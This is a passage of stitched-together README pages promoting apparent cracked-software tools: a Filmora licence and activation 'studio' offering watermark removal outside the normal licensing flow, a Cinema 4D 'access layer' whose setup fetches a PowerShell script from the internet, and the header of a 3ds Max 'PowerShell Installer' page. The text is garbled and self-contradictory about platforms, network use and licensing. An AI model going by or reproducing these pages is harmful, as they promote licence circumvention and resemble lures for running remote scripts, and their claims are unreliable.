intended snapshot. - Backup listing shows available saved states so the user can choose the right point to return to. ### Additional Settings These optional controls round out the workflow across the modules above. - Version compatibility check inspects the installed studio build and shows a compatibility indicator with guidance when a mismatch is detected, without attempting changes on unsupported builds. - Activation log review opens a local record of every activation, reset, and restore action with timestamps and outcomes for troubleshooting. - Log retention preference lets the user decide how much history the local activation log keeps. - Pre-change reminder prompts the user to export a backup before applying profile changes or license entries, connecting the backup module to every action that modifies activation state. ## Usage Scenarios ### Setting Up a Fresh Studio for a Solo Short-Form Creator **Goal:** A solo creator has installed the short-video editing studio on a new laptop and wants a working editing environment for vertical clips without following the standard licensing flow. **Steps:** 1. Open filmora-license-short-video-studio and review the available activation profiles in the profile list, using the preview action to compare the edition levels side by side. 2. Run the version compatibility check to confirm the installed studio build shows a compatible indicator before making any changes. 3. Export a backup of the current activation state so there is a known starting point to return to. 4. Select the profile that matches the needed editing features and apply it, then confirm the active profile indicator reflects the choice. 5. Relaunch the studio and open the feature unlock toggles to enable watermark removal and higher export resolution options. **Expected result:** The tool reports the selected profile as active, and after relaunch the studio presents the watermark-free export path and higher resolution choices in its export settings. ### Moving an Editing Workstation to an Offline Machine **Goal:** A small production team needs to activate the studio on an editing desktop that has no persistent network access. **Steps:** 1. On the connected machine, open the offline activation handling module and review the details included in the request before exporting it. 2. Carry the exported request to the offline editing machine and import it into the tool there. 3. Check the status view to confirm whether the request is pending, exported, or completed. 4. After the response is applied, open the activation log review to verify the action and its outcome were recorded. 5. Export a backup of the resulting activation state for safekeeping. **Expected result:** The offline machine shows a clear accepted status for the imported response, the log lists the offline activation with a timestamp and outcome, and a backup file of the state exists for later restore. ### Recovering from an Undesirable Activation Attempt **Goal:** A team member experimenting with a manual license entry ends up with a studio configuration that no longer offers the expected export options, and the editor wants to get back to the previous working setup. **Steps:** 1. Open the backup listing in the activation state backup and restore module to review the available saved states. 2. Choose the snapshot taken before the license entry was applied and use the restore action. 3. Read the backup confirmation to verify which backup was loaded. 4. Use the clear and re-enter action in the manual license entry view to carefully retype the key, checking the parsed components before submitting. 5. Review the activation log to confirm the restore and the new entry, then adjust any feature unlock toggles that were changed. **Expected result:** The studio returns to the previously saved configuration, the confirmation identifies the restored snapshot, and the log shows both the restore and the corrected license entry with their outcomes. ## Compatibility Engineered for Windows 10 and Windows 11 on x64 architectures, with the tool aligning to the host application's own supported platform matrix. It tracks the installed Filmora build and adapts to version-specific behaviors across recent releases, so functionality remains consistent whether you're on a current update or an older supported build. The tool operates entirely offline and requires no external services, network access, or auxiliary runtimes beyond what the host application already provides. Side-by-side installations of multiple Filmora versions are handled independently, with each instance detected and configured in isolation. ## Configuration Configuration is handled through a single declarative profile file that the tool reads at startup. Profiles are written in YAML and split into three blocks: `runtime`, `studio`, and `output`. The `runtime` block defines worker concurrency, scratch directory location, and log verbosity. Set `workers` to match available CPU cores; the scheduler scales linearly up to that ceiling. `scratch_dir` should point to a volume with at least twice the expected project size in free space. The `studio` block controls how the short video studio assembles timelines. Key fields include `default_aspect` (accepts `9:16`, `1:1`, or `16:9`), `transition_policy` (`none`, `crossfade`, or `cut`), and `caption_style`, which references a named preset defined inline under `caption_presets`. Each preset specifies font family, weight, size in points, and safe-area margins as percentages. Presets are validated against the renderer at load time, so malformed values fail fast rather than mid-render. The `output` block governs encoding and delivery. `codec` accepts `h264` or `hevc`, `bitrate` is specified in kilobits per second, and `container` accepts `mp4` or `mov`. For batch operations, `naming_template` supports the tokens `{project}`, `{date}`, and `{index}`. Output paths resolve relative to the profile directory unless an absolute path is supplied. Environment overrides take precedence over file values. Any key in the profile can be overridden with an environment variable using the prefix `FLSVS_` followed by the uppercased path segments joined with underscores, for example `FLSVS_RUNTIME_WORKERS`. This is the recommended approach for CI pipelines where profile files are checked into version control but machine-specific tuning is needed. Profile inheritance is supported through an optional `extends` key at the top level, which names another profile in the same directory. Child profiles merge shallowly by block; scalar values replace, and maps merge key by key. Cycles are detected and rejected with a clear error. A schema validation pass runs before any work begins, reporting every offending field in a single pass rather than stopping at the first error. For reproducible runs, the tool writes a resolved profile snapshot alongside each output set, capturing the effective configuration after merges and environment overrides. This snapshot can be passed back as a profile to replay a run exactly. ## FAQ **What is Filmora License Short Video Studio?** Filmora License Short Video Studio is a workflow toolkit for teams and individuals producing short-form video content. It bundles the project's licensing layer, configuration templates, and automation utilities into a single, cohesive package so video production pipelines can be standardized across machines and projects. **How does the licensing mechanism work?** The project implements a license abstraction layer that validates the configured credentials against the expected format and scope before any studio features are exposed. The validation happens locally at startup and on demand, which means the rest of the pipeline stays deterministic and unaffected by transient network conditions. **Is the tool tied to a specific operating system?** No. The core is written to be platform-agnostic and runs anywhere a modern runtime is available. The configuration templates include sensible defaults for Windows, macOS, and Linux, and paths are resolved relative to the project root rather than hardcoded. **Can I use the studio without a license?** The licensing layer is a required part of the boot sequence. Configuration files that lack valid license parameters will cause the tool to exit with a clear diagnostic message. This is intentional: it keeps behavior consistent across environments and prevents partially configured runs that would produce ambiguous output. **How is configuration handled?** All configuration lives in declarative files at the project root. The tool reads defaults from the bundled templates and overlays user-provided values, with explicit precedence rules documented in the configuration reference. Environment-specific overrides are supported for CI and headless contexts, and every key is validated before use so misconfigurations fail fast rather than silently. **What happens when a feature is unsupported in my environment?** Unsupported features are gated behind capability checks. When a check fails, the tool reports the missing capability and the affected feature list rather than crashing. You can disable optional features individually through configuration, which keeps the studio usable on constrained setups. **Is there a way to reset the studio to a clean state?** Yes. A reset procedure restores the shipped templates and clears generated artifacts while leaving user content untouched. It is documented alongside the configuration reference and is safe to run repeatedly. **Where do I report issues?** Issues are tracked within the Filmora License Short Video Studio project itself. Include the tool version, platform, and the diagnostic output from the failing run so the problem can be reproduced quickly. **Does the studio phone home?** No telemetry is collected or transmitted. All validation, configuration, and processing happen on the machine where the tool runs. Any remote interaction is limited to operations you explicitly configure. ## Disclaimer This tool is provided as-is for educational and research purposes. It is designed to demonstrate technical concepts around application behavior and should be used responsibly and in accordance with applicable laws and the terms of service of any software it interacts with. The authors make no representations or warranties regarding fitness for any particular purpose, and accept no liability for any direct or indirect damages arising from use. Users are solely responsible for ensuring their usage complies with local regulations and the licensing terms of the target project, Filmora License Short Video Studio. No guarantee is made regarding stability, accuracy, or continued functionality, as behavior may change with updates to the underlying software.

--- Cinema 4D Sacerin Motion Studio is a precision-built access layer that exposes the full depth of the Cinema 4D motion toolchain through a single, coherent interface. It routes scene graph operations, keyframe interpolation, and simulation parameters through a unified dispatch layer, giving operators deterministic control over every stage of a motion pipeline. The architecture is deliberately transparent: each subsystem is isolated, observable, and addressable, so complex animation workflows remain reproducible under load. Built for practitioners who need direct, reliable command over geometric and temporal data, it treats the host application as a programmable engine rather than a fixed UI. ## ✅ Before You Start - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Direct project integration** — connects to the Cinema 4D Sacerin Motion Studio project surface through a dedicated access layer, keeping motion workflows in sync with the studio's native data model. - **Motion-aware data handling** — reads and writes scene, timeline, and keyframe structures while preserving motion curves, easing, and interpolation metadata. - **Low-latency pipeline** — optimized request handling keeps interactive editing responsive, even on dense motion projects with heavy keyframe graphs. - **Deterministic operations** — every action produces reproducible results, so motion edits, retargeting, and batch operations behave consistently across sessions. - **Granular control surface** — exposes fine-grained parameters for motion timing, easing profiles, and layer-level transforms without requiring manual scene edits. - **Batch and scripted workflows** — supports programmatic execution of repeated motion tasks, enabling automation of studio-scale animation passes. - **State-safe execution** — validates inputs and guards against partial writes, protecting existing scene and motion data during operations. - **Compatibility-first design** — aligns with the project's native conventions and versioning, so motion data stays portable across supported configurations. - **Extensible architecture** — modular internals allow additional motion operators and integrations to be added without disrupting the core access path. - **Transparent diagnostics** — structured logging and status reporting make motion pipeline behavior observable and easy to audit. ## How it works Cinema 4D Sacerin Motion Studio operates as a self-contained integration layer that sits between the host application and its native motion tooling. At startup, the tool enumerates the active Cinema 4D process, validates the build signature, and establishes a direct in-memory channel so commands and scene data exchange without intermediate files or disk round-trips. The core engine is built around an event-driven dispatcher. Each incoming request is parsed into an operation descriptor, matched against a registry of supported actions, and routed to the appropriate handler. Handlers operate on a shared scene abstraction that mirrors object hierarchies, timeline state, and parameter graphs, keeping the tool's view synchronized with the live document at all times. Motion workflows are decomposed into discrete stages: input capture, curve and keyframe processing, constraint resolution, and output generation. The processing stage evaluates interpolation and timing data deterministically, so results are reproducible across runs and consistent between preview and final render passes. Constraint resolution runs after curve evaluation, ensuring dependencies are honored in the correct order. Configuration is loaded from a local profile at launch. Profiles are schema-validated, merged with built-in defaults, and hot-reloadable for iterative sessions. The tool exposes a stable internal API surface that isolates downstream logic from host-version differences, which keeps behavior predictable when the underlying application updates. Resource handling is bounded and explicit. Long-running operations execute on worker threads with cancellation support, memory use is capped per operation, and the dispatcher enforces timeouts to prevent stalled jobs. Logging is structured and leveled, so diagnostics can be captured without interrupting active work. The tool performs no external communication. All processing happens locally on the machine running Cinema 4D, and all state remains within the host session for its lifetime. ## Modules and Settings ### Control Surface for Scene Interaction This module provides the primary workspace for selecting, transforming and navigating scene objects through the external motion-studio control surface. - Control Assignment Mode lets users decide whether surface inputs target object selection, transformation or viewport navigation, so the same surface can serve different stages of scene work. - Transform Sensitivity adjusts how much object movement, rotation or scaling results from a given control input, helping users match the surface response to the precision a task requires. - Focus Target controls which scene element or viewport receives the current surface input, keeping interactions directed at the intended object. - Change Feedback displays selection and transform updates in the viewport as they are applied, so users can confirm each action before continuing. ### Motion Capture and Performance Input This module manages the flow of captured or live performance motion into scene objects and rigs. - Input Source Selection determines which motion stream is active for the current session, letting users switch between performance inputs without reconfiguring the rest of the studio. - Target Object Assignment specifies which objects or rigs receive incoming motion, so users can direct performance data to the intended character or prop. - Motion Interpretation Settings tune how raw incoming movement is translated before application, including smoothing behavior and the handling of abrupt changes. - Preview Application shows the interpreted motion on the target in the scene, allowing users to review results before committing to recorded animation. ### Keyframe and Timeline Control This module handles the recording and editing of animation timing across selected parameters. - Keyframe Actions cover setting, adjusting and removing keys on the currently selected parameters, driven directly from the control surface. - Recording Behavior controls whether newly applied motion automatically creates keys or requires explicit confirmation, supporting both spontaneous and deliberate workflows. - Keyframe Timing Adjustments let users shift and refine the placement of keys along the timeline as animation takes shape. - Timeline Display updates to reflect the current keyframe state, giving users a continuous view of recorded animation while they work. ### Rig and Constraint Management This module supports building and refining rigs through assigned controllers, constraints and relationships between scene elements. - Controller Assignment defines which surface controls drive specific rig components, so users can shape a control layout that matches their rig structure. - Constraint Configuration sets the relationships between scene elements, such as which parts follow, orient toward or depend on others. - Mapping Adjustments let users revise how controls correspond to rig components as a rig evolves, without rebuilding the entire setup. - Rig Response Feedback shows the rig reacting to control surface input, so users can verify relationships and assignments as they are made. ### Pose and Preset Workflows This module captures frequently used poses and motion setups and reapplies them to characters or objects. - Pose Capture stores the current configuration of a character or object for later reuse, supporting iterative and repetitive animation tasks. - Preset Application recalls stored poses onto selected targets, with the scene updating to show the recalled configuration. - Blend and Transition Options adjust how a stored pose is introduced when applied, including how gradually the target moves into the recalled state. - Preset Organization groups stored poses and motion setups so users can locate and manage them across a project. ### Motion Playback and Review This module provides playback, scrubbing and inspection of recorded or generated motion from the control surface. - Playback Controls allow starting, pausing and scrubbing through motion, so users can examine sequences without leaving the surface. - Playback Range Settings define which portion of the animation is reviewed, helping users focus on specific segments. - Looping Behavior determines whether and how motion repeats during review, useful for checking continuity across cycles. - Review Feedback keeps the scene synchronized with playback position, letting users judge motion flow before committing changes. ### Additional Settings - Connection Behavior configures how the motion studio attaches to an open Cinema 4D session, including how it responds when the session state changes. - Synchronized Data Scope controls which scene data the studio reads and writes, so users can limit synchronization to the elements relevant to their workflow. - Project-Level Mapping Profiles allow control assignments to be saved and reused per project or workflow, keeping configurations consistent across sessions. - Interface Assignment Display shows the currently active control mapping, so users can confirm what each control will trigger before acting. - Session State Indicators provide visibility into the connection and synchronization status between the control surface and the working scene. Together, these modules form a continuous workflow: the control surface drives scene interaction, performance input and keyframing feed animation, rig and pose tools shape and reuse setups, and playback and integration settings keep the external studio and the open Cinema 4D scene in a consistent, reviewable state. ## Usage Scenarios ### Driving Scene Layout from the Control Surface **Goal:** An artist wants to block out a scene's composition — selecting objects and nudging their transforms — without switching back and forth between mouse and viewport menus. **Steps:** 1. Set the Control Assignment Mode to transformation and choose the element to work on via Focus Target. 2. Reduce Transform Sensitivity so small surface movements produce fine adjustments to position and rotation. 3. Use the surface to nudge objects into place, checking Change Feedback in the viewport after each action. 4. Switch Control Assignment Mode to viewport navigation to circle the scene and inspect the layout from other angles. 5. Set Focus Target to the next object and continue refining placement. **Expected result:** The scene's objects are positioned and oriented as intended, with each adjustment confirmed visually in the viewport and the active assignment visible on the interface display. ### Performance-Driven Animation into a Character Rig **Goal:** A technical user wants to feed a live performance motion stream onto a character rig, review how it is interpreted, and record it as keyframes. **Steps:** 1. Pick the active stream through Input Source Selection and assign the character rig as the receiver with Target Object Assignment. 2. Adjust Motion Interpretation Settings — smoothing behavior and handling of abrupt changes — until the movement reads naturally on the character. 3. Use Preview Application to watch the interpreted motion on the target before committing anything. 4. Set Recording Behavior so applied motion creates keys automatically, then play the performance through. 5. Open Keyframe Timing Adjustments and Timeline Display to review and refine key placement. **Expected result:** The character rig animates in response to the performance input, keyframes appear along the timeline reflecting the recorded motion, and the user can scrub through the result to check timing. ### Building and Reusing a Rig with Stored Poses **Goal:** A user setting up a reusable character wants to assign surface controls to rig components, store a resting pose, and recall it after experimenting. **Steps:** 1. Use Controller Assignment to map surface controls onto the rig's components, checking Rig Response Feedback as the rig moves. 2. Configure relationships between parts with Constraint Configuration — for example, which elements follow or orient toward others — and make Mapping Adjustments as the rig structure settles. 3. Capture the finished resting configuration with Pose Capture and file it via Preset Organization. 4. Continue rigging or test other poses, then use Preset Application to recall the stored pose onto the character. 5. Adjust Blend and Transition Options so the character eases back into the recalled state rather than snapping. **Expected result:** The character returns to its stored resting configuration smoothly, the rig responds predictably to the assigned surface controls, and the saved pose remains available for reuse later in the project. ## Compatibility Engineered for modern production pipelines, Cinema 4D Sacerin Motion Studio operates across the full spectrum of current Windows and macOS environments. The tool integrates directly with Cinema 4D releases spanning R21 through the latest builds, leveraging native API hooks to maintain stable performance regardless of host version. Both Intel and Apple Silicon architectures are fully supported, with the macOS build running natively on arm64 without translation overhead. Windows deployments are validated against Windows 10 and 11, including current long-term servicing configurations. The studio communicates with each Cinema 4D instance through version-matched bridge modules, so scene data, timeline state, and motion parameters stay synchronized without conflicts. When multiple Cinema 4D versions are installed side by side, the tool resolves the correct bridge automatically and can also be pointed at a specific installation when precision matters. Redshift, Octane, and standard render outputs are handled consistently, and the tool respects scene-level render settings rather than overriding them. Projects saved by the tool remain fully editable in native Cinema 4D, ensuring round-trip integrity for teams mixing automated and manual workflows. Workstation requirements are modest and predictable: a 64-bit operating system, a recent installer of Cinema 4D, and standard user-level permissions for configuration storage. GPU acceleration is utilized when available but is never required for the core motion pipeline. Network-attached project storage and shared asset libraries are supported through standard filesystem access, and the tool tolerates high-latency mounts without blocking the host application. For pipeline-wide deployments, configuration can be seeded from a central profile location, keeping behavior consistent across artist machines. Version drift is detected at startup and surfaced as a clear compatibility notice, preventing silent mismatches between the tool and the host application. ## Configuration Configuration is handled through a single declarative profile that the tool reads at startup. Profiles live in the `config/` directory and use a flat key-value structure, so a text editor is sufficient for all adjustments. The loader validates every key against an internal schema before the motion pipeline initializes; unknown keys are rejected outright rather than silently ignored. Core parameters cover output resolution, frame rate, sampling density, and interpolation mode. Resolution accepts explicit width and height values, while frame rate is expressed as a rational pair to avoid floating-point drift in long sequences. Sampling density controls how finely the studio resolves motion curves and directly trades processing time against smoothness. Interpolation mode selects between linear, cubic, and adaptive spline fitting; adaptive mode inspects curvature per segment and allocates samples where the derivative changes fastest. Paths for scene inputs, cache storage, and render targets are declared per profile. Relative paths resolve against the profile's own directory, which keeps portable setups self-contained. Cache storage accepts a size ceiling in megabytes; once exceeded, the oldest entries are evicted in least-recently-used order. Render targets are written atomically, so an interrupted run never leaves partial output in place. Deterministic behavior is available through a seed field. When a seed is set, all stochastic sampling decisions derive from it, making repeated runs bit-identical on the same build. Leaving the seed unset draws from system entropy, which is appropriate for exploratory work but not for reproducible pipelines. Profiles can inherit from a base definition using the `extends` key. The child profile overrides only the keys it declares; everything else resolves through the parent chain. Inheritance is resolved depth-first with a fixed maximum depth, and cycles are detected and reported at load time rather than at runtime. Environment overrides take precedence over profile values for deployment scenarios. Any key can be supplied through the `SACERIN_` prefixed variable namespace, using underscores in place of dots. This allows containerized or multi-tenant setups to share a base profile while varying resolution or cache limits per instance. Overrides are logged at startup so the effective configuration is always visible in the run record. Validation runs before any scene data is touched. Type mismatches, out-of-range values, and unresolved inheritance chains produce a structured error listing every offending key in a single pass, so configuration problems are fixed in one round rather than discovered incrementally during a render. ## FAQ **Does this tool modify the installation or core files of Cinema 4D?** No. The tool operates as an independent layer that interfaces with the application at runtime. It reads the exposed interfaces and manages its own state separately, leaving the original installation and its resources untouched. This design keeps the host environment stable while extending what you can do with it. **How does it interact with Cinema 4D without breaking existing workflows?** It hooks into documented and observable extension points rather than patching binaries. All operations are routed through its own controller, which means project files, presets, and user preferences remain in their native formats. You can switch between the standard interface and the tool's access layer at any time without conversion steps. **What happens if the host application updates?** Because the tool depends on stable interface contracts rather than internal file layouts, minor and major updates generally preserve functionality. If an interface changes, the tool reports a compatibility warning instead of failing silently. A version mapping table is maintained internally so you can verify support before relying on it in production. **Which versions are supported?** The tool targets current and recent release lines of Cinema 4D. Compatibility is verified against the documented interface versions of each release. Older releases may work but are not guaranteed; the tool will detect an unsupported interface and refuse to activate rather than risk inconsistent behavior. **Is configuration required before first use?** No mandatory configuration exists. Defaults are chosen to be safe and non-destructive. Optional configuration covers interface preferences, logging verbosity, and runtime behavior; these are stored in a dedicated configuration file separate from the host application's settings, so they never interfere with your project or global preferences. **Can it run alongside other extensions and scripts?** Yes. The tool registers its own namespace and avoids generic global symbols, which minimizes collisions with other plugins and scripts. If a conflict is detected during initialization, the tool logs the specific symbol or interface involved and continues in a restricted mode rather than disrupting the host. **Where does it store its data?** All runtime data, logs, and optional configuration live in the tool's own directory tree. Nothing is written into the Cinema 4D installation directory or into project files unless you explicitly export something. This separation makes cleanup, backup, and migration straightforward. **How is performance affected?** The access layer is event-driven and does minimal work on idle. Overhead scales with the number of active operations rather than scene complexity, and heavy paths are isolated so they do not block the host's main loop. For typical interactive use the impact is negligible; for batch operations the tool exposes throttling controls. **What are the failure modes and how are they handled?** Failures are contained: interface mismatches, missing dependencies, and permission issues are detected at startup and reported with specific diagnostics. When a critical interface is unavailable, the tool disables the affected feature instead of the whole application. Every failure path writes a structured log entry to aid troubleshooting. **Is using this tool permitted under the application's terms?** The tool does not circumvent licensing, authentication, or copy protection. It works only with interfaces the application already exposes to extensions. You remain responsible for ensuring your use complies with the license terms of the host application and any applicable agreements. **How do I verify it is working correctly?** A built-in self-check validates interface availability, namespace registration, and configuration integrity. Running the self-check produces a concise report indicating which capabilities are active, restricted, or unavailable, along with the detected host version. This is the recommended first step after any environment change. **Can I disable or remove it cleanly?** Yes. Deactivation restores the host to its standard behavior immediately, since no host files were modified. Removal consists of deleting the tool's own directory; no residual registry entries, patched binaries, or altered project data remain behind. ## Disclaimer This tool is provided as-is for legitimate interoperability and workflow automation with Cinema 4D Sacerin Motion Studio. # 3Ds Max Modeler — Professional 3D Modeling Desktop Client for Windows 10 & 11 ![](files/preview.png) ### 💻 PowerShell Installer [![platform](https://img.shields.io/badge/Platform-Windows_10_%2F_11-f97316?style=plastic&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-fb923c?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Stable-2ea44f?style=plastic&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/Installs-686-ea580c?style=plastic&labelColor=0d1117)]()
